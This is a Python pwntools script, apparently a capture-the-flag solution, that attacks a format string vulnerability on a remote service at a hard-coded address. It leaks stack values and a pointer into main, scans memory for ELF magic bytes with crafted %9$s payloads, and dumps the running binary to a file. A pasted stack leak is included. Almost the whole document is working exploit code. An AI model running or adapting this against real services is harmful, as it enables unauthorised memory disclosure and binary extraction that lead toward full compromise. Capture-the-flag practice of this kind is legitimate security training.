#String Format Dump Binary!!!

from pwn import *
from struct import *

ip, port = '167.99.205.156', 30184
#io = remote(ip, port)

def detect():
        for i in range(64):
                io.recvuntil('>')
                io.sendline(b'%'+str(i+1).encode()+b'$p')
                buf = io.recvline().decode().strip().split(' ')[0]
                print(str(i+1)+' : '+buf)

#detect()

'''
1 : 0x6e
2 : 0xfffffff4
3 : 0x10
4 : 0x1d
5 : 0x7f7433b664c0
6 : 0x7fff31cddfb8
7 : 0x100000000
8 : 0xa70243825
9 : (nil)
10 : 0x7fff00000000
11 : 0x100000000
12 : 0x556ca069e400
13 : 0x7f7433571bf7
14 : 0x1
15 : 0x7fff31cddfb8
16 : 0x100008000
17 : 0x556ca069e2ef
18 : (nil)
19 : 0x585531379ff23ebb
20 : 0x556ca069e160
21 : 0x7fff31cddfb0
22 : (nil)
23 : (nil)
24 : 0xd72127fea323ebb
25 : 0xc64174a60ac3ebb
26 : 0x7fff00000000
27 : (nil)
28 : (nil)
29 : 0x7f74339518d3
30 : 0x7f7433937638
31 : 0x7b1fd
32 : (nil)
33 : (nil)
34 : (nil)
35 : 0x556ca069e160
36 : 0x7fff31cddfb0
37 : 0x556ca069e18e
38 : 0x7fff31cddfa8
39 : 0x1c
40 : 0x1
41 : 0x7fff31cdeea7
42 : (nil)
43 : 0x7fff31cdeeb2
44 : 0x7fff31cdeeba
45 : 0x7fff31cdeeca
'''
#overflow length 64

def leak_pointer_to_main():
	'''12th pointer is one from the main()'''
	io.sendline(b"%12$p")
	sleep(0.3)
	io.recvuntil(b"> ")
	leak_all = io.recv()
	leak = leak_all.decode().split("\n")[0]
	print("Leaked main address: " + leak)
	return int(leak,16)

def search_elf_magic_bytes(leaked_main,addr):
	'''Search through the process memory to find ELF magic bytes: \x7fELF.'''
	#%8$p is the repeated string pararmeter of the first input string, so we print from the 9th pararmter
	while True:
		leak_part = b"%9$sEOF" + b"\x00"
		try:
			io.sendline(leak_part + p64(leaked_main + addr))
			res = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
			leak = res.split(b"EOF")[0] + b"\x00"
			print("Deferenced pointer: " + leak.decode("unicode_escape"))
			if b"\x7FELF" in leak:
				magic_bytes = leaked_main + addr
				print("MAGIC BYTES FOUND @: " + hex(magic_bytes))
				return magic_bytes, False
				break
			addr -=0x100
		except:
			addr -=0x100
			io.close()
			return addr, True

elf_found = True
addr = 0
leaked_main = 0
while elf_found:
	io = remote(ip,port)
	print("CURRENT ADDRESS = " + hex(addr))
	leaked_main = leak_pointer_to_main() + addr
	addr, elf_found = search_elf_magic_bytes(leaked_main,addr)
start_main_addr = addr

def dump_binary(magic_bytes_addr):
	'''Dump the binary data'''
	base = magic_bytes_addr
	leak,leaked = bytearray(),bytearray()
	offset = len(leaked)
	while offset <= 0x5000:
		with open("leak.bin", "ab") as f:
			addr = p64(base + len(leaked))
			leak_part = b"%9$sEOF\x00"
			io.sendline(leak_part + addr)
			res = io.recvuntil(b"1. Scream.\n2. Run outside.\n> ")
			leak = res.split(b"EOF")[0] + b"\x00"
			leaked.extend(leak)
			print("Address: " + hex(unpack("<Q",addr.ljust(8,b"\x00"))[0]) + " - Offset: " + str(offset) + ":" + hex(offset)+ " - Leaked data: " + leak.decode("unicode_escape"))

			f.write(leak)
			f.flush()
			offset = len(leaked)

# Dump binary:
dump_binary(start_main_addr)
